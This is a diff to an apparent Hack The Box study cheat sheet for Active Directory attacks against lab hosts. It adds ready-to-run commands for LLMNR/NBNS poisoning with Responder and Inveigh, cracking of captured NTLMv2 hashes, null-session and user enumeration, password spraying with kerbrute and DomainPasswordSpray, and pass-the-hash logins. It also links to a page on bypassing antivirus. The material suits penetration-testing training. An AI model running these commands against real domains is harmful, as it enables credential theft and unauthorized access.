@@ -585,13 +585,24 @@ nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum-list.txt
 #Inveih.exe
 
 #Metasploit
+
+
 ```
 ##### LLMNR Poisoning
 ```
+#Responder linux
 sudo responder -I ens224 -A
 
 # Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+
+#Inveigh Windows LLMNR and NBNS spoofing
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+PS C:\htb> .\Inveigh.exe
+
+ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+
 ```
 ##### Password Spraying and Password Policies
 ```
@@ -607,6 +618,19 @@ rpcclient $> querydominfo
 # Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 
+#Enum4linux Password Policy
+enum4linux -P 172.16.5.5 (DC)
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+#Enum user null session
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+
+
+#Enumerating Null Session from Windows
+net use \\DC01\ipc$ "" /u:""
+net use \\DC01\ipc$ "" /u:guest
+net use \\DC01\ipc$ "password" /u:guest
+
 # Used to enumerate the password policy in a Windows domain from a Windows-based host.
 net accounts
 
@@ -619,16 +643,34 @@ rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser
 # Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
 crackmapexec smb 172.16.5.5 --users
 
+#If you have account and password you can pull more users
+crackmapexec smb 172.16.5.5 -u user -p password --users
+
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
 
+#windsearch.py
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
+
+# Create a list of user first: crackmapexec smb 172.16.7.50 -u ad.account -p password --users > ad_groups-list.txt
+# parse it: $cat user-ad-list.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
+
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+
+#Use Kerburte and jsmith.txt
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 
 # Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
 sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
+#Enumerating & Retrieving Password Policies from Windows
+import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 ##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
